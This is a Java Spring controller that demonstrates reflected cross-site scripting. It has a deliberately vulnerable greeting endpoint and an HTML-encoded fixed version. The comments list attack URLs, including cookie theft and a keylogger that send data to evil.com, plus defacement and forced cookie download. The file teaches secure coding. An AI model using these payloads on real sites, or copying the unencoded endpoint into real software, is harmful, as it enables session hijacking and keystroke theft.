package com.ntj.viabackend.controller;

import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

/**
 * ============================================================
 * DEMO: Cross-Site Scripting — XSS (CWE-79 / OWASP A03)
 * ============================================================
 *
 * Two endpoints that greet a user by reflecting their name:
 *
 *   VULNERABLE  →  GET /api/demo/xss/vulnerable?name=Alice
 *   FIXED       →  GET /api/demo/xss/secure?name=Alice
 *
 * Attack payload to try on the VULNERABLE endpoint:
 *   ?name=<script>alert('XSS')</script>
 *   ?name=<img src=x onerror=alert(document.cookie)>
 *   → browser executes attacker-injected JavaScript
 * ============================================================
 */
@RestController
@RequestMapping("/api/demo/xss")
public class XssController {

    // ----------------------------------------------------------------
    // ⚠️  VULNERABLE — raw user input reflected directly in HTML response
    //     Returns text/html so the browser will render and execute scripts
    //
    // EXAMPLE ATTACKS — paste these URLs in a browser:
    //
    //   1. Basic alert (classic proof-of-concept):
    //      GET /api/demo/xss/vulnerable?name=<script>alert('XSS')</script>
    //      → browser pops an alert box
    //
    //   2. Cookie theft:
    //      GET /api/demo/xss/vulnerable?name=<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
    //      → silently sends session cookies to attacker's server
    //
    //   3. Image tag with onerror (bypasses basic script-tag filters):
    //      GET /api/demo/xss/vulnerable?name=<img src=x onerror=alert(document.cookie)>
    //      → executes JS without a <script> tag
    //
    //   4. Defacement / phishing:
    //      GET /api/demo/xss/vulnerable?name=<h1 style="color:red">HACKED</h1>
    //      → rewrites visible page content
    //
    //   5. Keylogger injection:
    //      GET /api/demo/xss/vulnerable?name=<script>document.onkeypress=e=>fetch('https://evil.com/log?k='+e.key)</script>
    //      → every keystroke on the page is sent to attacker
    //   6. Cookie download (forces a file save to disk)
    //      GET /api/demo/xss/vulnerable?name=<script>const a=document.createElement('a');
    //        a.href='data:text/plain,'+document.cookie;
    //        a.download='cookies.txt';
    //        a.click();
    //      </script>
    //      → browser prompts the victim to save a file containing their session cookies
    // ----------------------------------------------------------------
    @GetMapping(value = "/vulnerable", produces = MediaType.TEXT_HTML_VALUE)
    public ResponseEntity<String> greetVulnerable(@RequestParam String name) {

        // ❌ VULNERABLE: user input embedded into HTML without encoding
        // CWE-79: Improper Neutralisation of Input During Web Page Generation
        // If name = <script>alert('XSS')</script>, the browser runs it
        String html = "<html><body>"
                + "<h2>VULNERABLE — Reflected XSS</h2>"
                + "<p>Hello, " + name + "!</p>"   // ❌ raw input injected into DOM
                + "</body></html>";

        return ResponseEntity.ok(html);
    }

    // ----------------------------------------------------------------
    // ✅  FIXED — all HTML special characters escaped before rendering
    // ----------------------------------------------------------------
    @GetMapping(value = "/secure", produces = MediaType.TEXT_HTML_VALUE)
    public ResponseEntity<String> greetSecure(@RequestParam String name) {

        // ✅ FIXED: encode all HTML special characters before inserting into the page
        // < > " ' & are converted to their HTML entity equivalents
        // The browser displays them as text — never executes them as code
        String safeName = htmlEncode(name);

        String html = "<html><body>"
                + "<h2>SECURE — HTML Encoded Output</h2>"
                + "<p>Hello, " + safeName + "!</p>"  // ✅ encoded — safe to render
                + "</body></html>";

        return ResponseEntity.ok(html);
    }

    /**
     * ✅ Simple HTML encoder — replaces the 5 dangerous characters.
     * In production use a library like OWASP Java Encoder or Apache Commons Text.
     */
    private String htmlEncode(String input) {
        if (input == null) return "";
        return input
                .replace("&",  "&amp;")   // must be first
                .replace("<",  "&lt;")
                .replace(">",  "&gt;")
                .replace("\"", "&quot;")
                .replace("'",  "&#x27;");
    }
}